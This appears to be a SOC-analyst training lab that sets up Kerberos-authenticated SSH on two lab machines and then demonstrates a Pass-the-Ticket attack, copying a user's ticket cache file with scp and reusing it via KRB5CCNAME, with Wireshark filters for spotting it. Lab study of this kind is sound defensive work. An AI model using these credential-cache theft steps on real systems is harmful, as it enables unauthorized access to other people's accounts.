


# Kerberos (Port 88) + SSH Practical Lab - SOC Analyst Roadmap
**By:** Muhammad Awais Javed (Mian Awais)  



## Lab Overview
This lab demonstrates **ticket-based authentication** using MIT Kerberos with SSH.  
Once a Kerberos ticket is obtained (`kinit`), we can login to the server **without typing password again**.

### Lab Environment
- **KDC Server**: 192.168.100.91 → hostname `kdc.lab.local`
- **Client**: 192.168.100.90 → hostname `client.lab.local`
- **Realm**: `LAB.LOCAL`
- **User**: `awais@LAB.LOCAL` (password: `Password123`)

---

## 1. Server Side Setup (KDC + SSH) - Run on 192.168.100.91

```bash
# Set hostname
sudo hostnamectl set-hostname kdc.lab.local

# Update /etc/hosts
sudo nano /etc/hosts
```
Paste:
```
127.0.0.1       localhost
127.0.1.1       kdc.lab.local kdc
192.168.100.91  kdc.lab.local kdc
192.168.100.90  client.lab.local client
```

```bash
# Install Kerberos KDC and SSH server
sudo apt update
sudo apt install -y krb5-kdc krb5-admin-server krb5-user openssh-server

# Configure krb5.conf
sudo nano /etc/krb5.conf
```
Paste:
```ini
[libdefaults]
    default_realm = LAB.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    LAB.LOCAL = {
        kdc = kdc.lab.local
        admin_server = kdc.lab.local
    }

[domain_realm]
    .lab.local = LAB.LOCAL
    lab.local = LAB.LOCAL
```

```bash
# Create Kerberos realm
sudo krb5_newrealm
# Set master password: Password123

# Enable services
sudo systemctl enable --now krb5-kdc krb5-admin-server ssh

# Add user principal
sudo kadmin.local -q "addprinc awais@LAB.LOCAL"
# Set password: Password123

# Add host principal for SSH
sudo kadmin.local -q "addprinc -randkey host/kdc.lab.local@LAB.LOCAL"
sudo kadmin.local -q "ktadd -k /etc/krb5.keytab host/kdc.lab.local@LAB.LOCAL"
```

```bash
# Enable Kerberos in SSH (important setting)
sudo nano /etc/ssh/sshd_config
```
Add at the bottom:
```ini
GSSAPIAuthentication yes
GSSAPICleanupCredentials yes
```

```bash
sudo systemctl restart ssh
```

---

## 2. Client Side Setup (192.168.100.90)

```bash
sudo apt install -y krb5-user

sudo nano /etc/krb5.conf
```
[libdefaults]
    default_realm = LAB.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    LAB.LOCAL = {
        kdc = 192.168.100.91:88
        admin_server = 192.168.100.91:749
    }

[domain_realm]
    .lab.local = LAB.LOCAL
    lab.local = LAB.LOCAL

---


**On Client:**

```bash
# 1. No ticket
kdestroy
klist

# 2. Normal SSH (asks password)
ssh awais@kdc.lab.local
# Type Password123 → then type exit

# 3. Get Kerberos ticket
kinit awais@LAB.LOCAL
# Type Password123

klist

# 4. Passwordless SSH using Kerberos ticket
ssh -o GSSAPIAuthentication=yes awais@kdc.lab.local
whoami
ls /srv/samba/AwaisShare
exit
```
```scp -o GSSAPIAuthentication=yes awais@kdc.lab.local:/srv/samba/AwaisShare/filename .    
ssh -v kali@192.168.100.91
sudo chown awais:awais /srv/samba/AwaisShar/filename 
sudo chown -R awais:awais /srv/samba/AwaisShare
sudo chmod -R 775 /srv/samba/AwaisShare
```


---

## 4. Wireshark Capture (What you will see)

**Filter (copy-paste):**
```
kerberos || ssh || (tcp.port == 88 || tcp.port == 22)
```

**What you will capture:**
- **First packets** → Kerberos on **port 88** (TGS-REQ / TGS-REP) → Kerberos issues the service ticket
- **Then packets** → SSH on **port 22** → Secure shell session starts

This visually proves Kerberos works **before** SSH.

---

## SOC Relevance (L2/L3)
Kerberos is the backbone of modern enterprise authentication.  
As SOC Analyst you will monitor port 88 for:
- Unusual ticket requests
- Kerberoasting, Golden Ticket, Pass-the-Ticket attacks

**Commands Summary:**
- `kinit` → Get ticket
- `klist` → Show tickets
- `kdestroy` → Remove ticket
- `ssh -o GSSAPIAuthentication=yes` → Use Kerberos ticket



### Lab Roles (Realistic Scenario)
- **Victim Machine** → KDC Server (192.168.100.91) — A user is already logged in with a valid Kerberos ticket.
- **Attacker Machine** → Your Client Laptop (192.168.100.90) — You steal the ticket and use it to login without password.

---

### **Full Detailed Pass-the-Ticket Lab**

#### **Phase 1: On Victim Machine (KDC Server - 192.168.100.91)**

This simulates a normal user who is already logged in.

```bash
# 1. Become the normal user (awais)
su - awais
```

(Enter the password for awais if asked)

```bash
# 2. Get a fresh Kerberos ticket (this is what attackers want to steal)
kinit awais@LAB.LOCAL
# Enter password: Password123 (or whatever you set)

# 3. Check the ticket
klist
```

**Leave this terminal open** (this simulates a logged-in user whose ticket we will steal).

---

#### **Phase 2: On Attacker Machine (Your Client Laptop - 192.168.100.90)**

```bash
# 1. First, make sure you can reach the victim
ping -c 3 192.168.100.91
```

```bash
# 2. Steal the ticket file from the victim (realistic way)
# We use scp to copy the ticket cache file from the victim machine
scp awais@192.168.100.91:/tmp/krb5cc_1000 /tmp/stolen_ticket.kirbi
```

(Enter the awais password when asked — this is the last time you need to type it)

```bash
# 3. Check the stolen ticket
ls -l /tmp/stolen_ticket.kirbi
```

---

#### **Phase 3: Use the Stolen Ticket (Pass-the-Ticket)**

On your **Client Laptop (Attacker)**:

```bash
# 4. Tell Kerberos to use the stolen ticket
export KRB5CCNAME=/tmp/stolen_ticket.kirbi

# 5. Check if the stolen ticket is active
klist
```

```bash
# 6. Login to the Victim machine WITHOUT typing password
ssh -o GSSAPIAuthentication=yes awais@kdc.lab.local
```

You should get logged in directly (no password prompt).

Inside the SSH session, run:
```bash
whoami
hostname
ls /srv/samba/AwaisShare
exit
```

---

### **Wireshark Capture (What Abnormal Packets Look Like)**

On your **Client Laptop (Attacker)**:

1. Start Wireshark
2. Filter:
   ```
   kerberos || ssh || (tcp.port == 88 || tcp.port == 22)
   ```
3. Start capture
4. Run the passwordless SSH command again:
   ```bash
   ssh -o GSSAPIAuthentication=yes awais@kdc.lab.local
   exit
   ```

**What you will see (Abnormal Behavior):**

- **First** → Many **Kerberos** packets on **port 88** (TGS-REQ / TGS-REP)
- **Then** → SSH packets on **port 22**
- **No normal password authentication packets** (no NTLM, no basic auth, no password in cleartext)
- The traffic looks like normal SSH, but the authentication was done using a stolen ticket.

This is what SOC analysts look for — unusual ticket usage from different machines or IPs.



